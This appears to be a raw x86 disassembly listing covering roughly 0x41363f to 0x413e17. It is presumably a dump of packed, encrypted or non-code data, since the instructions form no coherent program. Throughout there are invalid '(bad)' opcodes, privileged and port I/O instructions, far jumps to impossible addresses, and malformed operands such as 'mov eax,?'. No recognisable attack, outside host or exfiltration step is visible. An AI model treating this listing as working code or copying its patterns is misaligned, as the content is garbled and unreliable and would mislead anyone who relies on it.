  41363f:	cmp    eax,0xb02e6e32
  413644:	(bad)  
  413645:	fild   WORD PTR [esi-0x55]
  413648:	mov    esi,0x44446c33
  41364d:	inc    ecx
  41364e:	xor    ebx,esp
  413650:	fs mov cl,0x70
  413653:	add    bh,BYTE PTR [esi+0x21]
  413656:	shl    DWORD PTR [ebx],0x16
  413659:	nop
  41365a:	xor    ah,0xad
  41365d:	cmp    edx,DWORD PTR [edx+eiz*8-0x48cb413c]
  413664:	mov    bl,0x2d
  413666:	sub    dh,BYTE PTR [eax-0x7a47c94e]
  41366c:	hlt    
  41366d:	fisttp DWORD PTR [edi+0x65]
  413670:	gs ror dh,1
  413673:	and    edx,esi
  413675:	sahf   
  413676:	pop    ss
  413677:	mov    al,0xbc
  413679:	out    dx,eax
  41367a:	mov    BYTE PTR [ebx-0x55],cl
  41367d:	add    eax,0xd234bb19
  413682:	push   ecx
  413683:	or     eax,0xe479c0cf
  413688:	out    0xc4,eax
  41368a:	cmp    eax,0x478052f7
  41368f:	loopne 0x4136f4
  413691:	adc    al,0x96
  413693:	push   ebx
  413694:	push   esp
  413695:	mov    bl,0x4d
  413697:	sbb    DWORD PTR ds:0x846cb9e0,eax
  41369d:	dec    ebp
  41369e:	repnz pop esp
  4136a0:	or     BYTE PTR [ebp+0x3ae5cf0b],bl
  4136a6:	mov    cx,0xd707
  4136aa:	lea    ebx,[edx]
  4136ac:	dec    eax
  4136ad:	data16 sub al,0x94
  4136b0:	shl    edx,1
  4136b2:	loopne 0x413688
  4136b4:	pop    edi
  4136b5:	loop   0x413692
  4136b7:	fisttp DWORD PTR [ebx+esi*4+0x37b51df6]
  4136be:	retf   0x8806
  4136c1:	cwde   
  4136c2:	aas    
  4136c3:	ins    DWORD PTR es:[edi],dx
  4136c4:	xor    edx,DWORD PTR [eax]
  4136c6:	and    ebx,DWORD PTR [eax]
  4136c8:	enter  0xbdc2,0x2e
  4136cc:	sbb    al,0xc8
  4136ce:	les    edx,FWORD PTR [eax]
  4136d0:	bound  ecx,QWORD PTR [esi-0x4c]
  4136d3:	in     eax,0xf5
  4136d5:	or     al,BYTE PTR ds:0xd70d30e3
  4136db:	jmp    0x413664
  4136dd:	loopne 0x413690
  4136df:	mov    BYTE PTR [esi],al
  4136e1:	jo     0x413667
  4136e3:	inc    esi
  4136e4:	lahf   
  4136e5:	push   0xc53685a7
  4136ea:	fcom   QWORD PTR [eax-0x5c]
  4136ed:	xchg   ecx,eax
  4136ee:	mov    ebx,0x6120fa3a
  4136f3:	jle    0x4136d9
  4136f5:	push   ecx
  4136f6:	sbb    BYTE PTR [esi+0x63143b36],bl
  4136fc:	ror    ah,1
  4136fe:	hlt    
  4136ff:	sbb    esp,edx
  413701:	(bad)  
  413702:	pop    ebx
  413703:	mov    ebp,ebx
  413705:	xchg   DWORD PTR [edx+0x56],edx
  413708:	retf   0x8620
  41370b:	mov    ds,WORD PTR cs:[eax-0x45bf803e]
  413712:	aad    0xb9
  413714:	push   ss
  413715:	adc    DWORD PTR [ebx+ecx*4+0x24dfc370],ebx
  41371c:	inc    ecx
  41371d:	cmp    edx,0xffffff8a
  413720:	mov    WORD PTR [ebp-0x4d],ss
  413723:	stos   BYTE PTR es:[edi],al
  413724:	fdivp  st(6),st
  413726:	aaa    
  413727:	jo     0x413719
  413729:	sar    esp,cl
  41372b:	sub    BYTE PTR [ebx-0x50],cl
  41372e:	inc    esi
  41372f:	jnp    0x413735
  413731:	ret    0x6758
  413734:	sbb    al,ah
  413736:	and    al,0xac
  413738:	mov    bl,0xd6
  41373a:	cwde   
  41373b:	daa    
  41373c:	jo     0x4136e5
  41373e:	add    al,0x33
  413740:	or     eax,0xbae3139e
  413745:	jge    0x41371d
  413747:	pop    ss
  413748:	setle  BYTE PTR [eax+edx*1+0x1f]
  41374d:	sbb    DWORD PTR [eax+0xf936d14],esi
  413753:	adc    DWORD PTR [edi],ebp
  413755:	push   ebx
  413756:	mov    bl,0xec
  413758:	dec    ecx
  413759:	sub    eax,0x2e391294
  41375e:	bound  esp,QWORD PTR [edx]
  413760:	jmp    DWORD PTR [edx+eax*1+0x2e8180e]
  413767:	mov    cl,0x86
  413769:	out    0x36,al
  41376b:	loopne 0x413765
  41376d:	pop    esi
  41376e:	retf   0x3482
  413771:	es add dh,bh
  413774:	jle    0x413776
  413776:	inc    edx
  413777:	ss mov eax,0x325471a
  41377d:	popf   
  41377e:	pop    edi
  41377f:	or     al,0x6e
  413781:	jne    0x41371a
  413783:	add    al,0xbc
  413785:	xchg   BYTE PTR [ebp+0x2d],al
  413788:	ror    BYTE PTR [esi+ebx*4],cl
  41378b:	sbb    esp,DWORD PTR [ebp-0x4f010a00]
  413791:	arpl   cx,si
  413793:	xchg   esi,eax
  413794:	std    
  413795:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413796:	cmp    BYTE PTR [esi-0x3d7a073e],dh
  41379c:	push   ss
  41379d:	add    al,0xf5
  41379f:	pop    ds
  4137a0:	push   ebx
  4137a1:	cmp    eax,0x2d503e12
  4137a6:	push   edi
  4137a7:	or     bl,ch
  4137a9:	loope  0x413730
  4137ab:	dec    eax
  4137ac:	loopne 0x41373c
  4137ae:	dec    ecx
  4137af:	fcom   DWORD PTR [ebx]
  4137b1:	(bad)  
  4137b2:	sbb    BYTE PTR [eax-0x24a36dad],0x96
  4137b9:	pop    ecx
  4137ba:	pushf  
  4137bb:	mov    al,ds:0xe7ba1ca4
  4137c0:	fistp  DWORD PTR [edx-0xc0d697a]
  4137c6:	dec    edi
  4137c7:	push   es
  4137c8:	push   es
  4137c9:	ja     0x4137c8
  4137cb:	outs   dx,DWORD PTR ds:[esi]
  4137cc:	or     cl,BYTE PTR [eax+ebx*8+0x6530d6a0]
  4137d3:	ins    DWORD PTR es:[edi],dx
  4137d4:	jg     0x413777
  4137d6:	mov    eax,0x1e42d89c
  4137db:	xor    ebx,0x28
  4137de:	push   0xffffff87
  4137e0:	mov    edi,0xf2877a61
  4137e5:	icebp  
  4137e6:	push   edi
  4137e7:	cld    
  4137e8:	enter  0x4813,0x14
  4137ec:	clc    
  4137ed:	mov    ch,0x8a
  4137ef:	test   al,0x85
  4137f1:	sub    ebx,DWORD PTR [ecx+0x36]
  4137f4:	and    BYTE PTR [edx],bh
  4137f6:	bnd jle 0x413836
  4137f9:	iret   
  4137fa:	adc    DWORD PTR [ecx+0x2b],ebp
  4137fd:	pop    ecx
  4137fe:	push   esp
  4137ff:	xchg   ecx,eax
  413800:	add    DWORD PTR [eax+0x7a1e8ddf],0xca513f82
  41380a:	out    0x48,eax
  41380c:	aas    
  41380d:	int3   
  41380e:	add    bh,BYTE PTR [ebx-0x31]
  413811:	jae    0x4137e5
  413813:	jp     0x41379b
  413815:	mov    cl,BYTE PTR [edx-0x3619b836]
  41381b:	cmp    DWORD PTR [edx],ebp
  41381d:	imul   ebx,DWORD PTR [edx],0xffffff9d
  413820:	addr16 (bad) 
  413822:	fsubr  DWORD PTR ds:0x51ab83e8
  413828:	push   cs
  413829:	dec    ebp
  41382a:	js     0x413824
  41382c:	and    esi,DWORD PTR [edx+edi*4-0xc]
  413830:	popa   
  413831:	inc    DWORD PTR [ecx+0x3f6b940f]
  413837:	stos   DWORD PTR es:[edi],eax
  413838:	jne    0x41387b
  41383a:	cli    
  41383b:	mov    dl,0xe7
  41383d:	(bad)  
  413840:	jge    0x41384e
  413842:	shl    BYTE PTR [ebx+eiz*1+0x58f14bdd],0x2b
  41384a:	jmp    0xf3ee:0x144fa727
  413851:	xor    BYTE PTR [edi+edi*1],dh
  413854:	pop    edi
  413855:	push   ebp
  413856:	test   eax,0xe90bf3af
  41385b:	mov    dh,cl
  41385d:	dec    ebx
  41385e:	mov    bl,BYTE PTR [eax-0x8]
  413861:	cmp    DWORD PTR [ebx],esi
  413863:	and    BYTE PTR [ebx],ch
  413865:	push   ebp
  413866:	leave  
  413867:	out    0xc0,eax
  413869:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41386a:	push   esp
  41386b:	xchg   ebp,eax
  41386c:	pop    edx
  41386d:	mov    ds:0x6cdee015,al
  413872:	sahf   
  413873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413874:	sub    DWORD PTR [ecx],ebx
  413876:	cmp    esp,edi
  413878:	or     ecx,eax
  41387a:	sub    edx,DWORD PTR [ecx]
  41387c:	ins    DWORD PTR es:[edi],dx
  41387d:	pop    eax
  41387e:	push   edi
  41387f:	call   0x340f:0x6c39d4c6
  413886:	pop    ecx
  413887:	mov    eax,?
  413889:	jmp    0xc60020a6
  41388e:	mov    eax,ds:0x9fffcae7
  413893:	jno    0x413849
  413895:	fisttp DWORD PTR [ebx+0x35]
  413898:	mov    ds:0x34358d4d,eax
  41389d:	cld    
  41389e:	push   cs
  41389f:	cmp    dh,dl
  4138a1:	jns    0x413870
  4138a3:	pop    esi
  4138a4:	adc    eax,0x5cb8d8c9
  4138a9:	inc    eax
  4138aa:	gs mov cl,0xa2
  4138ad:	push   0x7a
  4138af:	fistp  QWORD PTR [eax-0x6d7fdbfe]
  4138b5:	fidivr WORD PTR [ebp-0x57]
  4138b8:	jbe    0x413845
  4138ba:	push   ss
  4138bb:	mov    al,0xc1
  4138bd:	ror    BYTE PTR [ebp-0x6957e9b8],0x24
  4138c4:	dec    edx
  4138c5:	cmp    BYTE PTR [ebp-0x431b54a9],ch
  4138cb:	loopne 0x413861
  4138cd:	pop    ebx
  4138ce:	pusha  
  4138cf:	fwait
  4138d0:	outs   dx,DWORD PTR ds:[esi]
  4138d1:	std    
  4138d2:	inc    esp
  4138d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138d4:	stc    
  4138d5:	addr16 es mov dl,0xcf
  4138d9:	sbb    eax,esi
  4138db:	jle    0x4138b5
  4138dd:	mov    bl,0x7a
  4138df:	cmp    DWORD PTR [edx+0x8],esp
  4138e2:	push   edi
  4138e3:	popa   
  4138e4:	rcl    BYTE PTR [eax+eiz*2-0x3d2b4a1f],1
  4138eb:	xor    al,0x96
  4138ed:	fcom   st(0)
  4138ef:	sbb    al,0xd6
  4138f1:	mov    bh,0xf5
  4138f3:	inc    ecx
  4138f4:	mov    ds:0x6ce9b0f6,eax
  4138f9:	in     eax,dx
  4138fa:	jge    0x41388b
  4138fc:	mov    dl,BYTE PTR ds:0x61c139a0
  413902:	or     DWORD PTR [esi+0x790128b0],0xd2e63cd6
  41390c:	out    0xc1,eax
  41390e:	test   BYTE PTR [edx-0x1cc15d62],0x83
  413915:	aam    0x4e
  413917:	mov    bh,0x70
  413919:	outs   dx,DWORD PTR ds:[esi]
  41391a:	xchg   esp,eax
  41391b:	sbb    eax,0xe7234733
  413920:	push   ds
  413921:	enter  0x2ec8,0xa0
  413925:	mov    esi,0xe2daebe2
  41392a:	jecxz  0x4138de
  41392c:	mov    esi,0xbc36bc1c
  413931:	sti    
  413932:	rcr    DWORD PTR es:[ebp-0x44eee772],1
  413939:	stos   BYTE PTR es:[edi],al
  41393a:	xchg   ebx,eax
  41393b:	add    dl,BYTE PTR [eax-0x18]
  41393e:	mov    DWORD PTR [edi-0x30],0xb8d1d2a6
  413945:	push   ebp
  413946:	int    0x99
  413948:	inc    esi
  413949:	mov    esp,0xdbf42338
  41394e:	xchg   DWORD PTR [edi],ebx
  413950:	ja     0x413901
  413952:	(bad)  
  413953:	xchg   edx,eax
  413954:	push   ss
  413955:	outs   dx,BYTE PTR ds:[esi]
  413956:	adc    DWORD PTR [esi],eax
  413958:	jmp    0xc6a4599b
  41395d:	neg    DWORD PTR [eax+edx*4+0x7a]
  413961:	push   0xffffff9a
  413963:	xor    ebp,DWORD PTR [eax-0x36601d7e]
  413969:	stos   BYTE PTR es:[edi],al
  41396a:	sbb    DWORD PTR [ecx],ebp
  41396c:	clc    
  41396d:	test   DWORD PTR [edi+0x6e1407c3],esi
  413973:	push   eax
  413974:	mov    al,0xe4
  413976:	fwait
  413977:	hlt    
  413978:	retf   0x3605
  41397b:	js     0x41399e
  41397d:	aaa    
  41397e:	sbb    BYTE PTR [edx-0x6f],bl
  413981:	stos   BYTE PTR es:[edi],al
  413982:	mov    WORD PTR [edi+0x1c],?
  413985:	push   ecx
  413986:	jnp    0x413999
  413988:	xlat   BYTE PTR ds:[ebx]
  413989:	ja     0x413a00
  41398b:	test   bl,cl
  41398d:	xor    eax,0x69f6cbed
  413992:	addr16 push ss
  413994:	fcom   DWORD PTR [edx]
  413996:	(bad)  
  413998:	icebp  
  413999:	je     0x4139ce
  41399b:	lahf   
  41399c:	xchg   dh,al
  41399e:	fnstcw WORD PTR [ebx+ecx*8+0x76]
  4139a2:	mov    ds:0x12ffbc35,eax
  4139a7:	adc    edx,DWORD PTR [ecx-0xedeb8b4]
  4139ad:	repnz or al,BYTE PTR [esi-0xf2de0f9]
  4139b4:	mov    DWORD PTR [eax+0x5d86eda2],0x22b8d5f0
  4139be:	mov    eax,0xb7ae920e
  4139c3:	adc    dl,BYTE PTR [edi]
  4139c5:	inc    ecx
  4139c6:	ret    
  4139c7:	repnz pop esp
  4139c9:	lods   al,BYTE PTR ds:[esi]
  4139ca:	adc    BYTE PTR [ebx+0x4bb53bda],bh
  4139d0:	mov    edi,0x4cdc0140
  4139d5:	sub    al,0x74
  4139d7:	or     dh,bl
  4139d9:	int    0xe2
  4139db:	ss test bl,bl
  4139de:	add    edi,DWORD PTR [ecx]
  4139e0:	repz mov dl,0x1d
  4139e3:	xchg   ecx,eax
  4139e4:	test   bl,bh
  4139e6:	fcomp  DWORD PTR [eax+eax*2-0x206268e3]
  4139ed:	push   edx
  4139ee:	repz inc ecx
  4139f0:	rcr    BYTE PTR [ecx+0x42],1
  4139f3:	(bad)  
  4139f4:	fiadd  WORD PTR [si-0xced]
  4139f9:	push   cs
  4139fa:	(bad)  
  4139fc:	fcomp  QWORD PTR [ebp+0x27]
  4139ff:	sar    edx,0x91
  413a02:	and    al,0xfb
  413a04:	push   edx
  413a05:	mov    bl,0xfc
  413a07:	cmp    eax,0xd8ff2bf9
  413a0c:	call   0x291d15f1
  413a11:	add    edi,ebx
  413a13:	loop   0x413a79
  413a15:	sub    esp,DWORD PTR [esi]
  413a17:	mov    ah,0x32
  413a19:	inc    esp
  413a1a:	stc    
  413a1b:	mov    ebp,0x30afd9f8
  413a20:	lahf   
  413a21:	sbb    BYTE PTR [ecx-0x1],bl
  413a24:	jge    0x413a43
  413a26:	gs xchg ecx,eax
  413a28:	push   0x1d
  413a2a:	addr16 jl 0x4139d5
  413a2d:	jg     0x413a06
  413a2f:	mov    al,0x62
  413a31:	and    BYTE PTR [eax],bh
  413a33:	retf   
  413a34:	mov    edi,0xd44d1cc9
  413a39:	inc    ebp
  413a3a:	xor    DWORD PTR [ebx-0x2aca91c9],edx
  413a40:	jo     0x413a1e
  413a42:	test   DWORD PTR [ebx+0x7f7cc7f0],esp
  413a48:	mov    dl,BYTE PTR [esi]
  413a4a:	lds    ebp,FWORD PTR [ecx+edi*2-0x3]
  413a4e:	cmp    DWORD PTR [esi+ebp*8+0x70],ecx
  413a52:	add    eax,0xfad4f504
  413a57:	push   edx
  413a58:	or     BYTE PTR [edx-0x2469db76],0x85
  413a5f:	pop    ecx
  413a60:	push   es
  413a61:	inc    ecx
  413a62:	je     0x413a2d
  413a64:	call   0xc25c497
  413a69:	or     eax,esp
  413a6b:	pop    ecx
  413a6c:	adc    eax,0x114e929
  413a71:	(bad)  
  413a72:	pop    edx
  413a73:	fmul   QWORD PTR [edx+ebp*8-0x7636dde5]
  413a7a:	fbld   TBYTE PTR [esi+0x42]
  413a7d:	inc    edx
  413a7e:	push   ebx
  413a7f:	popf   
  413a80:	out    0x57,eax
  413a82:	dec    ecx
  413a83:	push   edx
  413a84:	in     eax,dx
  413a85:	mov    ds,WORD PTR [edi-0x5d]
  413a88:	dec    BYTE PTR [ecx+0x2d]
  413a8b:	dec    ebp
  413a8c:	ss add eax,eax
  413a8f:	mov    dh,BYTE PTR [edi]
  413a91:	mov    edi,DWORD PTR [edx]
  413a93:	data16 inc BYTE PTR [ecx-0x74a6f6d2]
  413a9a:	push   edx
  413a9b:	jbe    0x413ae8
  413a9d:	dec    edi
  413a9e:	imul   ebx,DWORD PTR [edi-0x6a317709],0x888f475c
  413aa8:	mov    esi,esi
  413aaa:	jns    0x413aa9
  413aac:	sub    dl,BYTE PTR [ebx]
  413aae:	pop    edi
  413aaf:	xlat   BYTE PTR ds:[ebx]
  413ab0:	xchg   BYTE PTR [edx+0x4568ed26],bh
  413ab6:	inc    edi
  413ab7:	and    ecx,esp
  413ab9:	mov    esp,0xaff70637
  413abe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413abf:	jg     0x413ade
  413ac1:	cmp    esi,DWORD PTR [ebx]
  413ac3:	enter  0x95e7,0x93
  413ac7:	add    DWORD PTR [ebx-0xf],ebp
  413aca:	or     eax,0xd4499cf7
  413acf:	jb     0x413ad5
  413ad1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ad2:	shl    dl,cl
  413ad4:	retf   0xfb9a
  413ad7:	ins    DWORD PTR es:[edi],dx
  413ad8:	out    0x9c,eax
  413ada:	and    DWORD PTR [edi-0x2267a04e],esp
  413ae0:	mov    bl,0x53
  413ae2:	add    cl,BYTE PTR [esi]
  413ae4:	or     BYTE PTR [ebx+0x35f0974d],bh
  413aea:	add    edi,DWORD PTR fs:[edx-0x64f24d3]
  413af1:	das    
  413af2:	scas   eax,DWORD PTR es:[edi]
  413af3:	sbb    ebx,DWORD PTR [edx]
  413af5:	lods   al,BYTE PTR ds:[esi]
  413af6:	leave  
  413af7:	pop    esp
  413af8:	out    dx,eax
  413af9:	push   es
  413afa:	inc    edx
  413afc:	and    DWORD PTR [ebp-0x164f17b],0x6c
  413b03:	(bad)
  413b07:	mov    ss:0x7b437f97,al
  413b0d:	mov    eax,ds:0xb96e9745
  413b12:	sub    DWORD PTR ds:0xdf0653b5,ecx
  413b18:	cwde   
  413b19:	or     ch,BYTE PTR [esi+0x3a]
  413b1c:	adc    DWORD PTR [edx],edx
  413b1e:	pop    ecx
  413b1f:	mov    ecx,DWORD PTR [esi+0x39]
  413b22:	scas   eax,DWORD PTR es:[edi]
  413b23:	and    edi,DWORD PTR [edx+0x11]
  413b26:	xchg   ebx,eax
  413b27:	lods   eax,DWORD PTR ds:[esi]
  413b28:	pop    ss
  413b29:	pushf  
  413b2a:	(bad)  
  413b2b:	jns    0x413b8c
  413b2d:	mov    eax,ds:0xee68b0c4
  413b32:	fucom  st(1)
  413b34:	retf   
  413b35:	std    
  413b36:	call   DWORD PTR [eax-0x2e]
  413b39:	aaa    
  413b3a:	jno    0x413b5c
  413b3c:	cdq    
  413b3d:	sbb    ch,ah
  413b3f:	cdq    
  413b40:	cli    
  413b41:	cmc    
  413b42:	xor    bl,dh
  413b44:	inc    esi
  413b45:	add    ch,BYTE PTR [edx-0x3a0815f6]
  413b4b:	sub    BYTE PTR [ebp+0x4ed9623e],ch
  413b51:	add    al,0x62
  413b53:	or     DWORD PTR [esi],0xfffffffd
  413b56:	pushf  
  413b57:	add    BYTE PTR [ebp-0x3a668685],dl
  413b5d:	mov    edx,0x60e5a317
  413b62:	js     0x413b5a
  413b64:	xor    DWORD PTR [edi-0x4c83fcf2],eax
  413b6a:	sub    eax,0xbd0be368
  413b6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b70:	mov    edx,DWORD PTR [ecx+0x73148c48]
  413b76:	ret    0xbb55
  413b79:	cdq    
  413b7a:	ret    0xcdd7
  413b7d:	jmp    0xf912:0x22f428b2
  413b84:	xchg   ebp,eax
  413b85:	stos   BYTE PTR es:[edi],al
  413b86:	repz fld DWORD PTR [esi*8+0x430a40c6]
  413b8e:	jns    0x413b28
  413b90:	das    
  413b91:	rol    DWORD PTR [eax-0x29],0x14
  413b95:	test   ebx,ebx
  413b97:	and    al,0x63
  413b99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b9a:	rep stos DWORD PTR es:[edi],eax
  413b9c:	adc    DWORD PTR [eax-0x79663b23],0x593bdd4b
  413ba6:	sbb    BYTE PTR [eax+0x3ebe031f],cl
  413bac:	lahf   
  413bad:	xchg   esi,eax
  413bae:	pusha  
  413baf:	fist   DWORD PTR [ecx-0x25d643e2]
  413bb5:	aad    0x76
  413bb7:	scas   al,BYTE PTR es:[edi]
  413bb8:	lock cli 
  413bba:	jp     0x413bb2
  413bbc:	ret    
  413bbd:	(bad)  
  413bbe:	jp     0x413b77
  413bc0:	ret    0x751b
  413bc3:	out    0xea,al
  413bc5:	mov    edi,0x9587dd42
  413bca:	pushf  
  413bcb:	popf   
  413bcc:	xchg   ecx,eax
  413bcd:	pop    esi
  413bce:	sbb    DWORD PTR [esi+0x426fa048],esp
  413bd4:	aad    0x63
  413bd6:	lds    eax,FWORD PTR ds:[esi+edi*4-0x56]
  413bdb:	in     al,dx
  413bdc:	fmul   QWORD PTR [edi]
  413bde:	mov    ebp,edx
  413be0:	xor    dh,ch
  413be2:	or     DWORD PTR [eax-0x1d6217c4],0xffffff93
  413be9:	mov    ebp,0x7c5659ac
  413bee:	xchg   esp,eax
  413bef:	pop    edx
  413bf0:	mov    al,0x86
  413bf2:	or     esi,0xffffffe6
  413bf5:	mov    edx,0x88f26eca
  413bfa:	xchg   edi,eax
  413bfb:	je     0x413c74
  413bfd:	(bad)  
  413bfe:	(bad)  
  413bff:	or     DWORD PTR [ebx-0x1f4e8cf1],ebp
  413c05:	shl    cl,cl
  413c07:	jmp    0x36225261
  413c0c:	loop   0x413b9a
  413c0e:	and    al,0xba
  413c10:	lods   al,BYTE PTR ds:[esi]
  413c11:	sti    
  413c12:	sbb    al,0x1d
  413c14:	imul   ebx,DWORD PTR [ecx+0x70d443e],0xffffffa3
  413c1b:	stc    
  413c1c:	pop    ecx
  413c1d:	das    
  413c1e:	sub    ebp,DWORD PTR [ebx-0x2]
  413c21:	clc    
  413c22:	jmp    0xc29:0x983ff364
  413c29:	call   0xae0e67cf
  413c2e:	adc    BYTE PTR [esi-0x5a],dh
  413c31:	dec    edx
  413c32:	cmp    DWORD PTR [edx-0x74],ecx
  413c35:	pusha  
  413c36:	cdq    
  413c37:	and    al,0x5d
  413c39:	cwde   
  413c3a:	xor    al,BYTE PTR [edx+0x6f]
  413c3d:	jmp    0x413c13
  413c3f:	or     dh,BYTE PTR [eax+0x7380d6eb]
  413c45:	push   eax
  413c46:	cmc    
  413c47:	mov    dh,0xd3
  413c49:	test   BYTE PTR [edx+0x55],bh
  413c4c:	dec    esp
  413c4d:	mul    edi
  413c4f:	dec    edi
  413c50:	retf   0xc795
  413c53:	mov    al,ds:0x9bfabf56
  413c58:	into   
  413c59:	dec    ecx
  413c5a:	mov    ebp,0xaca36002
  413c5f:	fisubr DWORD PTR [ebx]
  413c61:	mov    ds:0x7c3d7d99,al
  413c66:	repnz (bad) 
  413c68:	mov    ch,0xe8
  413c6a:	cmp    ah,BYTE PTR [esi+eiz*2-0x5b3e998b]
  413c71:	mov    WORD PTR [edi],ds
  413c73:	mov    ?,ecx
  413c75:	lock rol DWORD PTR [edi+0x4d15cf76],cl
  413c7c:	dec    eax
  413c7d:	mov    ch,0xd7
  413c7f:	xor    bl,BYTE PTR [edi+0x72]
  413c82:	test   eax,0x2062c431
  413c87:	arpl   WORD PTR [eax],ax
  413c89:	xor    ebx,edi
  413c8b:	sub    BYTE PTR [edi+0x77],dl
  413c8e:	sub    eax,0x3432ff42
  413c93:	sbb    edx,eax
  413c95:	out    0x45,eax
  413c97:	in     eax,0x19
  413c99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c9a:	(bad)  
  413c9b:	mov    dl,0x24
  413c9d:	sub    esp,DWORD PTR [edi-0x35b2911c]
  413ca3:	mov    ah,0xe5
  413ca5:	retf   
  413ca6:	stc    
  413ca7:	test   BYTE PTR [esi+0x79],ah
  413caa:	out    dx,eax
  413cab:	cmp    DWORD PTR [eax+edi*1],ecx
  413cae:	(bad)  
  413caf:	adc    al,ch
  413cb1:	lahf   
  413cb2:	ins    BYTE PTR es:[edi],dx
  413cb3:	inc    ebx
  413cb4:	pop    edi
  413cb5:	mov    bh,0x92
  413cb7:	das    
  413cb8:	bound  ebp,QWORD PTR [ebp+0x6]
  413cbb:	mov    dl,0xe3
  413cbd:	(bad)  
  413cbe:	les    ebp,FWORD PTR [edx+0x63]
  413cc1:	xchg   esp,eax
  413cc2:	and    dl,dl
  413cc4:	pop    ds
  413cc5:	cdq    
  413cc6:	cs stos DWORD PTR es:[edi],eax
  413cc8:	(bad)  
  413cc9:	mov    eax,0xf627a22e
  413cce:	mov    ah,0xaf
  413cd0:	das    
  413cd1:	pop    ds
  413cd2:	nop
  413cd3:	repz jmp 0x80244fce
  413cd9:	shl    ch,1
  413cdb:	cmp    ch,al
  413cdd:	pop    edi
  413cde:	out    0xfa,al
  413ce0:	stos   DWORD PTR es:[edi],eax
  413ce1:	icebp  
  413ce2:	in     al,0x13
  413ce4:	in     al,dx
  413ce5:	js     0x413c76
  413ce7:	and    esi,edi
  413ce9:	jb     0x413c79
  413ceb:	mov    eax,0x4a60caa6
  413cf0:	push   ebp
  413cf1:	dec    eax
  413cf2:	call   DWORD PTR [eax+0x29]
  413cf5:	addr16 clc 
  413cf7:	in     al,dx
  413cf8:	push   0xffffffeb
  413cfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cfb:	adc    ebp,DWORD PTR [ecx]
  413cfd:	dec    ebp
  413cfe:	in     eax,0x66
  413d00:	add    BYTE PTR [ebp+0x1c],bh
  413d03:	hlt    
  413d04:	aaa    
  413d05:	sti    
  413d06:	rcl    DWORD PTR [ebx+0xe],cl
  413d09:	inc    ebx
  413d0a:	sti    
  413d0b:	retf   
  413d0c:	je     0x413c96
  413d0e:	inc    ecx
  413d0f:	lods   eax,DWORD PTR ds:[esi]
  413d10:	push   ds
  413d11:	pop    ebx
  413d12:	int    0x45
  413d14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d16:	sar    DWORD PTR [edx+ecx*4],cl
  413d19:	adc    DWORD PTR [edi-0x35bf026e],edx
  413d1f:	pop    ecx
  413d20:	fsub   st(0),st
  413d22:	dec    ebx
  413d23:	add    dh,bl
  413d25:	push   esi
  413d26:	dec    ebp
  413d27:	gs jmp 0x413cb0
  413d2a:	jecxz  0x413da2
  413d2c:	es int 0x2a
  413d2f:	mov    ebx,0x3fdb065e
  413d34:	mov    esp,0xfc266483
  413d39:	imul   BYTE PTR [edi-0x6d]
  413d3c:	dec    esi
  413d3d:	xchg   ebp,eax
  413d3e:	inc    ebx
  413d3f:	adc    esi,esp
  413d41:	stos   BYTE PTR es:[edi],al
  413d42:	xchg   esp,eax
  413d43:	mov    DWORD PTR [edi+ebx*4],ecx
  413d46:	add    eax,0xc3b8ee86
  413d4b:	enter  0xdeb9,0xe8
  413d4f:	sbb    edi,esp
  413d51:	pop    ss
  413d52:	jge    0x413d2a
  413d54:	mov    bh,BYTE PTR [ebx-0x3749a313]
  413d5a:	or     BYTE PTR [ebx-0x14],ah
  413d5d:	mov    ch,0xd2
  413d5f:	gs xchg dl,ch
  413d62:	xchg   ecx,eax
  413d63:	pop    ebp
  413d64:	sbb    eax,DWORD PTR [esp+edi*4-0x28]
  413d68:	cmp    al,0xfe
  413d6a:	mov    ebp,0x520a46f5
  413d6f:	adc    ebp,edi
  413d71:	fist   DWORD PTR [ebp-0x64]
  413d74:	(bad)  
  413d75:	jmp    0x4b938443
  413d7a:	ret    0xd6fe
  413d7d:	pop    eax
  413d7e:	and    DWORD PTR [eax+ebp*2],esp
  413d81:	(bad)  
  413d82:	fidivr DWORD PTR cs:[ecx-0x227aa9fa]
  413d89:	xor    al,0x74
  413d8b:	mov    esp,0xdfe279be
  413d90:	fs jp  0x413da7
  413d93:	enter  0xff0a,0xc2
  413d97:	ds adc bh,bh
  413d9a:	lods   eax,DWORD PTR ds:[esi]
  413d9b:	mov    dh,0x2e
  413d9d:	aaa    
  413d9e:	sub    bl,BYTE PTR [eax+0x6f54a6d5]
  413da4:	fstp   TBYTE PTR [ecx]
  413da6:	in     eax,0x77
  413da8:	in     al,0xad
  413daa:	and    eax,0x5daa3e09
  413daf:	mov    edx,DWORD PTR [edi]
  413db1:	and    eax,0xba55daf9
  413db6:	xchg   esp,eax
  413db7:	sub    eax,0x7f2d2b85
  413dbc:	in     eax,dx
  413dbd:	sbb    DWORD PTR [edi+0x7dcc957a],ecx
  413dc3:	mov    WORD PTR [esi+0x30],es
  413dc6:	lea    ebx,[edi-0xd5ebbbf]
  413dcc:	fimul  DWORD PTR [esi+0x1c07965c]
  413dd2:	mov    eax,0x96a45e8b
  413dd7:	push   esp
  413dd8:	xchg   ebx,eax
  413dd9:	repnz push 0x6f36b218
  413ddf:	or     esp,ecx
  413de1:	dec    esp
  413de2:	out    0xbd,al
  413de4:	(bad)  
  413de5:	inc    eax
  413de6:	push   0xd43ccb7c
  413deb:	pushf  
  413dec:	mov    ds:0x1f0e1738,eax
  413df1:	aaa    
  413df2:	nop
  413df3:	and    eax,0x8e9351fb
  413df8:	cmp    al,0x7e
  413dfa:	mov    BYTE PTR [ebp+0x54],ch
  413dfd:	out    0x1a,eax
  413dff:	sbb    edi,DWORD PTR ds:0x29a56902
  413e05:	adc    cl,BYTE PTR [ebp-0xb0282c3]
  413e0b:	or     eax,0x84118a85
  413e10:	enter  0x994,0xa1
  413e14:	fwait
  413e15:	das    
  413e16:	retf   
  413e17:	(bad)  
